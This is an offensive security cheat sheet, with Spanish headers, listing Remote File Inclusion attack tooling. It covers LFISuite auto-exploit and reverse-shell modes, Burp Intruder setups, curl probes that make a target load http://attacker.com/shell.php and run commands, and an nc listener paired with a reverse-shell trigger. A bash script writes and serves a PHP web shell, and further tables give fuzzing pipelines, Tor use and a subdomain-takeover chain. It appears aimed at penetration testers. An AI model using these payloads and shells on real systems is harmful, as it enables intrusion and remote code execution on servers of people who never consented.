---
aliases:
  - RFI Tooling
  - LFISuite RFI
  - Burp RFI
tags:
  - type/tool
  - vuln/rfi
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[Remote File Inclusion (RFI)]]'
  - '[[Burp Suite]]'
---
# RFI - Tooling

***

## LFISuite RFI Mode

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/D35m0nd142/LFISuite && cd LFISuite && python LFISuite.py` | Install + interactive | Setup. |
| `python LFISuite.py -t target.com -P /vuln.php` | Auto-scanner mode | Auto-scan. |
| `python LFISuite.py -u "https://target/page?file=" -c "session=abc"` | Direct URL with cookie | Authenticated. |
| `python LFISuite.py -u "https://target/?page=" -e -s php` | Auto-exploit con PHP shell | RCE attempt. |
| `python LFISuite.py -u "https://target/?page=" -e -r 10.10.10.10:4444` | Reverse shell auto | RS auto. |
| `python LFISuite.py -u "https://target/?page=" -T` | Tor anonymity | Tor relay. |
| `python LFISuite.py -u "https://target/?page=" -v --proxy http://127.0.0.1:8080` | Verbose + Burp proxy | Debug + intercept. |
| `python LFISuite.py -u "https://target/?page=" -m` | Multi-vector probes (LFI+RFI) | Comprehensive. |
| Edit `shells.php` in LFISuite/shells/ → custom payload | Custom shell payload | Customize. |
| `python LFISuite.py -u "https://target/?page=" --rfi-host http://attacker.com` | RFI-mode con custom payload host | RFI host config. |
^rfi-tool-lfisuite

___

## Burp Intruder + Payloads

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Intruder → set `§...§` en `?page=` param → Sniper attack | Single position RFI fuzz | Standard. |
| Burp Intruder Payload Type "Simple list" → load `PayloadsAllTheThings/File Inclusion/Intruder/rfi.txt` | Load RFI payloads | Standard. |
| Burp Intruder Payload Type "Numbers" range for IP iterate | Iterate IP-based RFI URLs | IP iterate. |
| Burp Intruder Options → Grep Match `uid=\|phpinfo\|GIF89` | Match RCE indicators | Validation. |
| Burp Intruder Options → Grep Extract `uid=[0-9]+\([^)]+\)` | Extract user info | Show contents. |
| Burp Intruder Filter Status `200` + Length ≠ baseline | Filter success diff | Visual. |
| Burp Intruder Resource Pool throttle=200ms | Pacing | Anti-rate-limit. |
| Burp Intruder Payload Processing → "URL-encode key characters" | Auto-encode | Encoding. |
| Burp BApp Store → "Param Miner" install + run | Discover hidden RFI params | Pre-attack. |
| Burp BApp Store → "Hackvertor" install (encoding payloads) | Custom encoding | Bypass. |
| Right-click request → "Engagement tools" → "Scan" → "Open scan launcher" | Active Scan RFI checks | Built-in. |
| Burp BApp Store → "Logger++" filter `response.matches("phpinfo()")` | Filter RFI candidates passively | Passive. |
| Burp Collaborator client → generate URL → use in RFI probe | OOB callback for blind RFI | OOB validation. |
^rfi-tool-burp

___

## Manual curl Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?page=http://attacker.com/shell.php&c=id'` | Standard single probe | Quick. |
| `curl 'https://target/?page=http://attacker.com:8080/shell.php&c=id'` | Custom port probe | Non-standard port. |
| `curl 'https://target/?page=https://attacker.com/shell.php&c=id'` | HTTPS attacker | TLS-aware. |
| `curl 'https://target/?page=http://CALLBACK.oast.fun/probe'` (Collaborator) | Burp Collaborator OOB callback | OOB validation. |
| `for u in 'http' 'https' 'ftp' 'smb'; do echo "[+] $u"; curl "https://target/?page=$u://attacker.com/shell.php&c=id"; done` | Multi-scheme loop | Schemes probe. |
| `python3 -m http.server 80 & curl 'https://target/?page=http://attacker.com/shell.php&c=id' && kill $!` | Setup server + probe + cleanup | One-shot. |
| `python3 -c "import urllib.parse; print(urllib.parse.quote_plus('http://attacker.com/shell.php'))"` | URL-encode payload | Encode helper. |
| `nc -lvnp 4444 & curl 'https://target/?page=http://attacker.com/rev.php'` | Setup listener + RFI revshell trigger | RS trigger. |
| `curl -s 'https://target/?page=http://attacker.com/shell.php&c=id' \| grep -oE 'uid=[0-9]+\([^)]+\)'` | Extract RCE indicator | Validation. |
| `xxd <(curl -s 'https://target/?page=http://attacker.com/x')` | Inspect raw bytes response | Debug. |
| `printf 'GET /?page=http://attacker.com/shell.php HTTP/1.1\r\nHost: target\r\n\r\n' \| ncat --ssl target 443` | Raw HTTP via ncat | Low-level. |
| `curl -F 'file=@shell.php' https://target/upload && curl 'https://target/?page=https://target/uploads/shell.php&c=id'` | Upload + self-RFI loop | Combo. |
^rfi-tool-curl

### Bash one-liner

```bash
TARGET="https://target/index.php"
PARAM="page"
ATTACKER_HOST="attacker.com"

# Setup attacker server
mkdir -p /tmp/rfi && cd /tmp/rfi
echo '<?php system($_GET["c"]); ?>' > shell.php
python3 -m http.server 80 &
SERVER_PID=$!

# Probe RFI
RESULT=$(curl -s "${TARGET}?${PARAM}=http://${ATTACKER_HOST}/shell.php&c=id")

if echo "$RESULT" | grep -qE 'uid=[0-9]+'; then
    echo "[+] RFI confirmed!"
    echo "$RESULT" | grep -oE 'uid=[0-9]+\([^)]*\)'
else
    echo "[-] No RFI"
fi

kill $SERVER_PID
```

___

## Wordlists

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && ls 'PayloadsAllTheThings/File Inclusion/Intruder/'` | PayloadsAllTheThings RFI list | Standard. |
| `cat /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt` | SecLists LFI/RFI list | Foundation. |
| `wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruder/RFI.txt` | RFI Intruder wordlist | Burp load. |
| `wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt` | Huge LFI list (overlaps RFI) | Huge. |
| `python3 -c "schemes=['http','https','ftp','data','php','smb','expect','phar']; [print(s+'://attacker.com/shell.php') for s in schemes]" > rfi.txt` | Generate scheme variants list | Custom gen. |
| `python3 -c "wrappers=['data://text/plain;base64,','php://input','expect://','phar://','file://']; [print(w) for w in wrappers]" > wrappers.txt` | PHP wrappers list | PHP-specific. |
| `cat /usr/share/seclists/Fuzzing/LFI/LFI-with-null-byte.txt \| sed 's,/etc/passwd,http://attacker.com/shell.php,'` | Adapt LFI NUL list to RFI | Adapt. |
| `python3 -c "[print(f'http://attacker.com/shell.php{c}') for c in ['','?','%23','%00','?ext=','%20']]" > rfi-suffixes.txt` | Trailing char variants | Suffix variants. |
| `python3 -c "import urllib.parse; print(urllib.parse.quote('http://attacker.com/shell.php',safe=''))"` | URL-encode single payload | Encode helper. |
| `git clone https://github.com/fuzzdb-project/fuzzdb && ls fuzzdb/attack/rfi/` | FuzzDB RFI corpus | Foundation. |
^rfi-tool-wordlists

___

## Otros Tools

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `dotdotpwn.pl -m http-url 'https://target/?page=TRAVERSAL' -s -f /etc/passwd -k root:` | dotdotpwn URL mode | LFI+RFI mode. |
| `nuclei -t http/vulnerabilities/generic/rfi-generic.yaml -u https://target` | Nuclei generic RFI template | Auto detect. |
| `nuclei -t http/vulnerabilities/ -tags rfi -u https://target` | Nuclei tag filter RFI | Templates tag. |
| `ffuf -u 'https://target/?page=FUZZ' -w rfi.txt -mr 'uid=\|phpinfo'` | ffuf RFI match | Fast fuzz. |
| `ffuf -u 'https://target/?page=http://attacker.com/FUZZ' -w files.txt -mr 'uid='` | ffuf payload-file fuzz | Variant. |
| `wfuzz -c -z file,rfi.txt --hh 0 'https://target/?page=FUZZ'` | wfuzz RFI | wfuzz alt. |
| `zaproxy -cmd -port 8080 -quickurl https://target -quickprogress` | OWASP ZAP CLI scan | Free alt. |
| `dalfox url 'https://target/?page=test'` | Dalfox XSS+RFI scan | Adjacent. |
| `gau target.com \| grep -E "(page=\|file=\|include=)" \| nuclei -t rfi.yaml` | URL discovery + RFI scan pipe | Recon pipe. |
| `waybackurls target.com \| grep -E "page=\|file=" > rfi-candidates.txt` | Wayback URLs param discover | Pre-fuzz. |
| `katana -u https://target/ \| grep -E 'page=\|file=' \| ffuf -u 'INPUT' -w rfi.txt -replay-proxy http://127.0.0.1:8080` | Crawl + fuzz pipeline | Pipeline. |
| `subjack -w subs.txt -t 100` (claim sub) luego host payload + RFI probe | SDT + RFI chain | SDT combo. |
^rfi-tool-others

***
